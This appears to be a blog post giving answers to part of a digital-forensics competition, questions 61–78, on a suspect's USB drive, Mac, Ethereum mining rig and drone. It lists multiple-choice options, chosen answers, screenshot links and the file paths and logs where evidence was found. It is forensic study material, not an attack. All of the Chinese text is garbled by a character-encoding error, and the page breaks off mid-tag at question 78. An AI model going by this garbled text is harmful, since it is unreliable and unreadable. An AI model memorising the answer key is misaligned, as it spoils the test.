ä»¥ä¸‹å“ªä¸ªå®¢æˆ·æ•°æ®å‚¨å­˜åœ¨å¸¸å¨Uç›˜å†… ï¼Ÿ (3åˆ†)</h3><p>A. jmuat1@reference.com</p><p>B. cgeraudg@forbes.com</p><p>C. cwarmishamo@admin.ch</p><p>D. abddfdf@google.com</p><p>E. alex1234@apple.com</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172247491.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172307318.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172320851.png" class="">  <p>ABC</p><h2 id="MACè®¡ç®—æœº"><a href="#MACè®¡ç®—æœº" class="headerlink" title="MACè®¡ç®—æœº"></a>MACè®¡ç®—æœº</h2><h3 id="61-å•é€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºä¸Šä¸€ä¸ªç³»ç»Ÿç‰ˆæœ¬æ˜¯ç”šä¹ˆåŠç°æ­£è¿è¡Œå“ªä¸€ä¸ªç‰ˆæœ¬çš„ç³»ç»Ÿ-3åˆ†"><a href="#61-å•é€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºä¸Šä¸€ä¸ªç³»ç»Ÿç‰ˆæœ¬æ˜¯ç”šä¹ˆåŠç°æ­£è¿è¡Œå“ªä¸€ä¸ªç‰ˆæœ¬çš„ç³»ç»Ÿ-3åˆ†" class="headerlink" title="61. [å•é€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºä¸Šä¸€ä¸ªç³»ç»Ÿç‰ˆæœ¬æ˜¯ç”šä¹ˆåŠç°æ­£è¿è¡Œå“ªä¸€ä¸ªç‰ˆæœ¬çš„ç³»ç»Ÿ? (3åˆ†)"></a>61. [å•é€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºä¸Šä¸€ä¸ªç³»ç»Ÿç‰ˆæœ¬æ˜¯ç”šä¹ˆåŠç°æ­£è¿è¡Œå“ªä¸€ä¸ªç‰ˆæœ¬çš„ç³»ç»Ÿ? (3åˆ†)</h3><p>A. MacOS 10.11.6 and MacOS 11.6</p><p>B. MacOS 10.11.5 and MacOS 11.5</p><p>C. MacOS 10.11.4 and MacOS 11.6</p><p>D. ä»¥ä¸Šçš†é<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172527425.png" class=""><br>è„±åˆ°å–è¯å¤§å¸ˆé‡Œï¼Œå‘ç°å†…å®¹éå¸¸çš„å°‘ï¼ŒçŒœæµ‹æ˜¯æœ‰åˆ†åŒºè¢«åŠ å¯†äº†ï¼Œç»“åˆä¸Šé¢å†usbé‡Œå–åˆ°çš„å¯†ç æˆ‘ä»¬æ¥è¿›è¡Œè§£å¯†<br>å¦‚ä½•å†ç»§ç»­å–è¯<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-173506243.png" class=""><br>å½“å‰ç‰ˆæœ¬ä¸º11.6<br>å†åœ¨æ–‡ä»¶é‡Œæœç´¢versionå¯ä»¥æœç´¢åˆ°<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-173543771.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-173439549.png" class=""><br>ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ï¼š Preboot\root\4A14282D-8DC8-3473-BB07-F12364604073\System\Library\CoreServices\systemVersion.plist</p><p>å†å²ç‰ˆæœ¬ä¿¡æ¯ï¼šåˆ†åŒº1[apfsb0]\Chris - Data\root\private\var\db\PreviousSystemVersion.plist</p><p>åº”ç”¨å†å²å®‰è£…è®°å½•ï¼šåˆ†åŒº1[apfsb0]:\Chris - Data:\root\Library\Receipts\InstallHistory.plist</p><h3 id="62-å¤šé€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºçš„ç³»ç»Ÿäº‹ä»¶çºªå½•å†…å“ªä¸ªå·æ ‡-Flag-æ˜¯å…³äºå‚¨å­˜æ¡£æ¡ˆäºè®¡ç®—æœº-3åˆ†"><a href="#62-å¤šé€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºçš„ç³»ç»Ÿäº‹ä»¶çºªå½•å†…å“ªä¸ªå·æ ‡-Flag-æ˜¯å…³äºå‚¨å­˜æ¡£æ¡ˆäºè®¡ç®—æœº-3åˆ†" class="headerlink" title="62. [å¤šé€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºçš„ç³»ç»Ÿäº‹ä»¶çºªå½•å†…å“ªä¸ªå·æ ‡(Flag)æ˜¯å…³äºå‚¨å­˜æ¡£æ¡ˆäºè®¡ç®—æœº? (3åˆ†)"></a>62. [å¤šé€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºçš„ç³»ç»Ÿäº‹ä»¶çºªå½•å†…å“ªä¸ªå·æ ‡(Flag)æ˜¯å…³äºå‚¨å­˜æ¡£æ¡ˆäºè®¡ç®—æœº? (3åˆ†)</h3><p>A. Created</p><p>B. InodeMetaMod</p><p>C. FinderInfoChanged</p><p>D. IsDirectory</p><p>E. OwnerChanged<br>ABCEå¥½åƒæ˜¯ç†è®ºçŸ¥è¯†ã€‚</p><h3 id="63-å¤šé€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºæ›¾è¿æ¥å“ªä¸€ä¸ªæ— çº¿ç½‘ç»œSSID-2åˆ†"><a href="#63-å¤šé€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºæ›¾è¿æ¥å“ªä¸€ä¸ªæ— çº¿ç½‘ç»œSSID-2åˆ†" class="headerlink" title="63. [å¤šé€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºæ›¾è¿æ¥å“ªä¸€ä¸ªæ— çº¿ç½‘ç»œSSID? (2åˆ†)"></a>63. [å¤šé€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºæ›¾è¿æ¥å“ªä¸€ä¸ªæ— çº¿ç½‘ç»œSSID? (2åˆ†)</h3><p>A. wai wifi</p><p>B. wanchainew1</p><p>C. central2</p><p>D. Hongkong1<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-174104952.png" class=""><br>ç½‘ç»œä¿¡æ¯é‡Œçœ‹ä¸åˆ°wifiçš„å…·ä½“åå­—ã€‚è¦å»å¯†ç /å¯†ç æ£€ç´¢é‡Œæ‰¾<br>AB</p><h3 id="64-å•é€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ç”šä¹ˆæ—¶å€™å°†â€éš”ç©ºæŠ•é€â€-airdrop-è½¬æ¢è‡³ä»»ä½•äººæ¨¡å¼-2åˆ†"><a href="#64-å•é€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ç”šä¹ˆæ—¶å€™å°†â€éš”ç©ºæŠ•é€â€-airdrop-è½¬æ¢è‡³ä»»ä½•äººæ¨¡å¼-2åˆ†" class="headerlink" title="64. [å•é€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ç”šä¹ˆæ—¶å€™å°†â€éš”ç©ºæŠ•é€â€(airdrop)è½¬æ¢è‡³ä»»ä½•äººæ¨¡å¼? (2åˆ†)"></a>64. [å•é€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ç”šä¹ˆæ—¶å€™å°†â€éš”ç©ºæŠ•é€â€(airdrop)è½¬æ¢è‡³ä»»ä½•äººæ¨¡å¼? (2åˆ†)</h3><p>A. 2021-10-21 16:52:48 (UTC +8)</p><p>B. 2021-10-21 18:52:48 (UTC +8)</p><p>C. 2021-10-21 06:52:48 (UTC +8)</p><p>D. 2021-10-21 08:52:48 (UTC +8)</p><h3 id="65-å¡«ç©ºé¢˜-å¸¸å¨MACè®¡ç®—æœºçš„APFSå‚¨å­˜å®¹å™¨çš„æ–‡ä»¶ç­¾åæ˜¯-ï¼Œåç§»å€¼ä¸º-ä¾‹å¦‚NTFSåŠ64ï¼Œè¯·è¾“å…¥-NTFS64-ã€‚-2åˆ†"><a href="#65-å¡«ç©ºé¢˜-å¸¸å¨MACè®¡ç®—æœºçš„APFSå‚¨å­˜å®¹å™¨çš„æ–‡ä»¶ç­¾åæ˜¯-ï¼Œåç§»å€¼ä¸º-ä¾‹å¦‚NTFSåŠ64ï¼Œè¯·è¾“å…¥-NTFS64-ã€‚-2åˆ†" class="headerlink" title="65. [å¡«ç©ºé¢˜] å¸¸å¨MACè®¡ç®—æœºçš„APFSå‚¨å­˜å®¹å™¨çš„æ–‡ä»¶ç­¾åæ˜¯__ï¼Œåç§»å€¼ä¸º__(ä¾‹å¦‚NTFSåŠ64ï¼Œè¯·è¾“å…¥ NTFS64)ã€‚ (2åˆ†)"></a>65. [å¡«ç©ºé¢˜] å¸¸å¨MACè®¡ç®—æœºçš„APFSå‚¨å­˜å®¹å™¨çš„æ–‡ä»¶ç­¾åæ˜¯<strong><em>__</em></strong>ï¼Œåç§»å€¼ä¸º<strong>__</strong>(ä¾‹å¦‚NTFSåŠ64ï¼Œè¯·è¾“å…¥ NTFS64)ã€‚ (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-175557650.png" class="">  <p>ç¬¬ä¸€è¡Œçš„å¼€å¤´ä¸ºåç§»é‡ç¬¬äºŒå«çš„å¼€å¤´ä¸ºç­¾åå³NXSBå’Œ32 Fä¸ç”¨ç®¡</p><h3 id="66-å•é€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºçš„é•œåƒæ¡£æ¡ˆå†…ï¼Œæ€»å…±æœ‰å¤šå°‘ä¸ªç³»ç»Ÿé»˜è®¤çš„å·æ ‡-1åˆ†"><a href="#66-å•é€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºçš„é•œåƒæ¡£æ¡ˆå†…ï¼Œæ€»å…±æœ‰å¤šå°‘ä¸ªç³»ç»Ÿé»˜è®¤çš„å·æ ‡-1åˆ†" class="headerlink" title="66. [å•é€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºçš„é•œåƒæ¡£æ¡ˆå†…ï¼Œæ€»å…±æœ‰å¤šå°‘ä¸ªç³»ç»Ÿé»˜è®¤çš„å·æ ‡? (1åˆ†)"></a>66. [å•é€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºçš„é•œåƒæ¡£æ¡ˆå†…ï¼Œæ€»å…±æœ‰å¤šå°‘ä¸ªç³»ç»Ÿé»˜è®¤çš„å·æ ‡? (1åˆ†)</h3><p>A. 4</p><p>B. 5</p><p>C. 6</p><p>D. 7</p><p>é€‰ B<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180601177.png" class="">  </p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180508725.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180454060.png" class="">  <h3 id="67-å¡«ç©ºé¢˜-å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ä¸Šä¸€æ¬¡å…³é—­æµè§ˆå™¨æ—¶ï¼Œæ­£åœ¨æµè§ˆå¤šå°‘ä¸ªç½‘é¡µ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3åˆ†"><a href="#67-å¡«ç©ºé¢˜-å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ä¸Šä¸€æ¬¡å…³é—­æµè§ˆå™¨æ—¶ï¼Œæ­£åœ¨æµè§ˆå¤šå°‘ä¸ªç½‘é¡µ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3åˆ†" class="headerlink" title="67. [å¡«ç©ºé¢˜] å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ä¸Šä¸€æ¬¡å…³é—­æµè§ˆå™¨æ—¶ï¼Œæ­£åœ¨æµè§ˆå¤šå°‘ä¸ªç½‘é¡µ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (3åˆ†)"></a>67. [å¡«ç©ºé¢˜] å¸¸å¨MACè®¡ç®—æœºçš„ä½¿ç”¨è€…ä¸Šä¸€æ¬¡å…³é—­æµè§ˆå™¨æ—¶ï¼Œæ­£åœ¨æµè§ˆå¤šå°‘ä¸ªç½‘é¡µ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (3åˆ†)</h3><p>10<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180651788.png" class="">  </p><h3 id="68-å¤šé€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸ªæ¡£æ¡ˆå¹¶ä¸æ˜¯iPhoneæ‰€æ‹æ‘„çš„å›¾ç‰‡-2åˆ†"><a href="#68-å¤šé€‰é¢˜-å¸¸å¨MACè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸ªæ¡£æ¡ˆå¹¶ä¸æ˜¯iPhoneæ‰€æ‹æ‘„çš„å›¾ç‰‡-2åˆ†" class="headerlink" title="68. [å¤šé€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸ªæ¡£æ¡ˆå¹¶ä¸æ˜¯iPhoneæ‰€æ‹æ‘„çš„å›¾ç‰‡? (2åˆ†)"></a>68. [å¤šé€‰é¢˜] å¸¸å¨MACè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸ªæ¡£æ¡ˆå¹¶ä¸æ˜¯iPhoneæ‰€æ‹æ‘„çš„å›¾ç‰‡? (2åˆ†)</h3><p>A. IMG_0002</p><p>B. IMG_0003</p><p>C. IMG_0004</p><p>D. IMG_0005</p><p>E. IMG_0006<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180824960.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180842557.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-181025772.png" class="">  </p><p>ADæœç´¢ä¸åˆ°</p><h2 id="çŸ¿æœº"><a href="#çŸ¿æœº" class="headerlink" title="çŸ¿æœº"></a>çŸ¿æœº</h2><h3 id="69-å¤šé€‰é¢˜-åœ¨å¸¸å¨çš„çŸ¿æœºæ²¡æœ‰è¿›è¡Œå“ªç§åŠ å¯†è´§å¸æ˜çŸ¿-2åˆ†"><a href="#69-å¤šé€‰é¢˜-åœ¨å¸¸å¨çš„çŸ¿æœºæ²¡æœ‰è¿›è¡Œå“ªç§åŠ å¯†è´§å¸æ˜çŸ¿-2åˆ†" class="headerlink" title="69. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çš„çŸ¿æœºæ²¡æœ‰è¿›è¡Œå“ªç§åŠ å¯†è´§å¸æ˜çŸ¿ ? (2åˆ†)"></a>69. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çš„çŸ¿æœºæ²¡æœ‰è¿›è¡Œå“ªç§åŠ å¯†è´§å¸æ˜çŸ¿ ? (2åˆ†)</h3><p>A. Bitcoin</p><p>B. Ethereum</p><p>C. RVN</p><p>D. Dodge</p><p>E. ENJ<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-184823554.png" class=""><br>åªèƒ½æœåˆ°A<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190251099.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190304151.png" class=""><br>æœä¸€ä¸‹å¯ä»¥æœåˆ°<br>PhoenixMiner<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190344581.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190810741.png" class=""><br>åœ¨logæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°logã€‚<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-191611531.png" class=""><br>å¯ä»¥å‘ç°æ˜¯ä»¥å¤ªåŠ</p><h3 id="70-å¡«ç©ºé¢˜-åœ¨å¸¸å¨çŸ¿æœºæœ‰å‡ å¼ æ˜¾ç¤ºé€‚é…å™¨è¿›è¡Œæ˜çŸ¿-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#70-å¡«ç©ºé¢˜-åœ¨å¸¸å¨çŸ¿æœºæœ‰å‡ å¼ æ˜¾ç¤ºé€‚é…å™¨è¿›è¡Œæ˜çŸ¿-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="70. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨çŸ¿æœºæœ‰å‡ å¼ æ˜¾ç¤ºé€‚é…å™¨è¿›è¡Œæ˜çŸ¿ ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>70. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨çŸ¿æœºæœ‰å‡ å¼ æ˜¾ç¤ºé€‚é…å™¨è¿›è¡Œæ˜çŸ¿ ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-191710650.png" class="">  <p>åªèƒ½æ‰¾åˆ°GPU1å’ŒGPU2<br>ä¸¤å¼ </p><h3 id="71-å•é€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœº-hive-OS-æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆç‰ˆæœ¬-1åˆ†"><a href="#71-å•é€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœº-hive-OS-æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆç‰ˆæœ¬-1åˆ†" class="headerlink" title="71. [å•é€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœº, hive OS æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆç‰ˆæœ¬ ? (1åˆ†)"></a>71. [å•é€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœº, hive OS æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆç‰ˆæœ¬ ? (1åˆ†)</h3><p>A. 5.4.0 <strong>*</strong></p><p>B. 6.0.1 <strong>*</strong></p><p>C. 7.0.2 <strong>*</strong></p><p>D. 10.0.2<strong>*</strong></p><p>E. 15.1.2<strong>*</strong><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-184412231.png" class=""><br>ç›´æ¥uname -açœ‹å…¶å†…æ ¸ä¿¡æ¯<br>é€‰A</p><h3 id="72-å¤šé€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-å“ªä¸ªä¸æ˜¯æ”¶å–æ˜çŸ¿æ”¶ç›Šçš„åŠ å¯†è´§å¸é’±åŒ…åœ°å€-1åˆ†"><a href="#72-å¤šé€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-å“ªä¸ªä¸æ˜¯æ”¶å–æ˜çŸ¿æ”¶ç›Šçš„åŠ å¯†è´§å¸é’±åŒ…åœ°å€-1åˆ†" class="headerlink" title="72. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­, å“ªä¸ªä¸æ˜¯æ”¶å–æ˜çŸ¿æ”¶ç›Šçš„åŠ å¯†è´§å¸é’±åŒ…åœ°å€ ? (1åˆ†)"></a>72. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­, å“ªä¸ªä¸æ˜¯æ”¶å–æ˜çŸ¿æ”¶ç›Šçš„åŠ å¯†è´§å¸é’±åŒ…åœ°å€ ? (1åˆ†)</h3><p>A. <code>0xE365625f4**537151304ceba7C7D9dF0C7E829**</code></p><p>B. <code>0xe68de863f4c3c3cc0**191b9cefdae91b3e6fbd8**</code></p><p>C. <code>0x00000000897**f4136b4a59731680a88f895303**</code></p><p>D. <code>0x7335c**20f9533d9cc825e2a6e80821fd44e27f8**</code></p><p>E. <code>0x00**000089705f4136b4a59731680a88f895303**</code><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192203181.png" class=""><br>æœç´¢walletå¯ä»¥æ‰¾åˆ°é’±åŒ…é…ç½®å‘ç°åªæœ‰A<br>BCDE</p><h3 id="73-å•é€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-ç”¨äºæ˜çŸ¿ç™»å…¥å¯†ç æ˜¯ä»€ä¹ˆ-2åˆ†"><a href="#73-å•é€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-ç”¨äºæ˜çŸ¿ç™»å…¥å¯†ç æ˜¯ä»€ä¹ˆ-2åˆ†" class="headerlink" title="73. [å•é€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­, ç”¨äºæ˜çŸ¿ç™»å…¥å¯†ç æ˜¯ä»€ä¹ˆ ? (2åˆ†)"></a>73. [å•é€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­, ç”¨äºæ˜çŸ¿ç™»å…¥å¯†ç æ˜¯ä»€ä¹ˆ ? (2åˆ†)</h3><p>A. eg97em**wm</p><p>B. Deg97em**wm</p><p>C. feg97em**wm</p><p>D. eeg97em**wm</p><p>E. heg97em**wm<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192332911.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192634251.png" class=""><br>ä¹Ÿå¯ä»¥åœ¨rig.confé‡Œæ‰¾åˆ°</p><h3 id="74-å¡«ç©ºé¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-ç”¨äºæ˜çŸ¿Nvidiaæ˜¾ç¤ºé€‚é…å™¨æ‰€ä½¿ç”¨çš„é©±åŠ¨ç¨‹å¼ä½¿ç”¨ä»€ä¹ˆç‰ˆæœ¬-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#74-å¡«ç©ºé¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-ç”¨äºæ˜çŸ¿Nvidiaæ˜¾ç¤ºé€‚é…å™¨æ‰€ä½¿ç”¨çš„é©±åŠ¨ç¨‹å¼ä½¿ç”¨ä»€ä¹ˆç‰ˆæœ¬-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="74. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­,ç”¨äºæ˜çŸ¿Nvidiaæ˜¾ç¤ºé€‚é…å™¨æ‰€ä½¿ç”¨çš„é©±åŠ¨ç¨‹å¼ä½¿ç”¨ä»€ä¹ˆç‰ˆæœ¬?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>74. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­,ç”¨äºæ˜çŸ¿Nvidiaæ˜¾ç¤ºé€‚é…å™¨æ‰€ä½¿ç”¨çš„é©±åŠ¨ç¨‹å¼ä½¿ç”¨ä»€ä¹ˆç‰ˆæœ¬?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192800745.png" class="">  <p>PhoenixMineræ—¥å¿—é‡Œå¯ä»¥æ‰¾åˆ°</p><h3 id="75-å¤šé€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-ç”¨äºæ˜çŸ¿æ˜¾ç¤ºé€‚é…å™¨å‹å·åŒ…æ‹¬ä»€ä¹ˆ-2åˆ†"><a href="#75-å¤šé€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœºä¸­-ç”¨äºæ˜çŸ¿æ˜¾ç¤ºé€‚é…å™¨å‹å·åŒ…æ‹¬ä»€ä¹ˆ-2åˆ†" class="headerlink" title="75. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­, ç”¨äºæ˜çŸ¿æ˜¾ç¤ºé€‚é…å™¨å‹å·åŒ…æ‹¬ä»€ä¹ˆ? (2åˆ†)"></a>75. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœºä¸­, ç”¨äºæ˜çŸ¿æ˜¾ç¤ºé€‚é…å™¨å‹å·åŒ…æ‹¬ä»€ä¹ˆ? (2åˆ†)</h3><p>A. GeForce RTX 3060</p><p>B. Quadro P2000</p><p>C. RX 6600</p><p>D. GeForce GTX 1660 Ti</p><p>E. GeForce GTX 3070<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192916539.png" class=""><br>A,B</p><h3 id="76-å¤šé€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœº-å“ªä¸€å¤©æ²¡æœ‰è¿›è¡Œæ˜çŸ¿-2åˆ†"><a href="#76-å¤šé€‰é¢˜-åœ¨å¸¸å¨çŸ¿æœº-å“ªä¸€å¤©æ²¡æœ‰è¿›è¡Œæ˜çŸ¿-2åˆ†" class="headerlink" title="76. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœº, å“ªä¸€å¤©æ²¡æœ‰è¿›è¡Œæ˜çŸ¿? (2åˆ†)"></a>76. [å¤šé€‰é¢˜] åœ¨å¸¸å¨çŸ¿æœº, å“ªä¸€å¤©æ²¡æœ‰è¿›è¡Œæ˜çŸ¿? (2åˆ†)</h3><p>A. 2021-10-06</p><p>B. 2021-10-09</p><p>C. 2021-10-15</p><p>D. 2021-10-17</p><p>E. 2021-10-18<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193040954.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193054629.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193112699.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193146698.png" class=""><br>BCDEæ—¥å¿—é‡Œåªæœ‰6å·çš„</p><h2 id="æ— äººæœº"><a href="#æ— äººæœº" class="headerlink" title="æ— äººæœº"></a>æ— äººæœº</h2><h3 id="77-å¡«ç©ºé¢˜-å¸¸å¨çš„æ— äººæœºä¸­çš„é£èˆªçºªå½•-DATå¯è§åˆ°äº2021å¹´10æœˆ11æ—¥1505æ—¶çš„GPSåœ°ç‚¹ã€‚-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#77-å¡«ç©ºé¢˜-å¸¸å¨çš„æ— äººæœºä¸­çš„é£èˆªçºªå½•-DATå¯è§åˆ°äº2021å¹´10æœˆ11æ—¥1505æ—¶çš„GPSåœ°ç‚¹ã€‚-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="77. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ— äººæœºä¸­çš„é£èˆªçºªå½•_.DATå¯è§åˆ°äº2021å¹´10æœˆ11æ—¥1505æ—¶çš„GPSåœ°ç‚¹ã€‚(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>77. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ— äººæœºä¸­çš„é£èˆªçºªå½•<strong><strong>_</strong></strong>.DATå¯è§åˆ°äº2021å¹´10æœˆ11æ—¥1505æ—¶çš„GPSåœ°ç‚¹ã€‚(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-194507665.png" class="">  <p>åœ¨æ‰‹æœºçš„ä½ç½®é‡Œå¯ä»¥æ‰¾åˆ°ä¸ºFLY093</p><h3 id="78-å•é€‰é¢˜-å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥15-07-51æ—¶ä¹‹é—´æ‰€åœ¨çš„åœ°ç‚¹æ˜¯ä»€ä¹ˆ-1åˆ†"><a 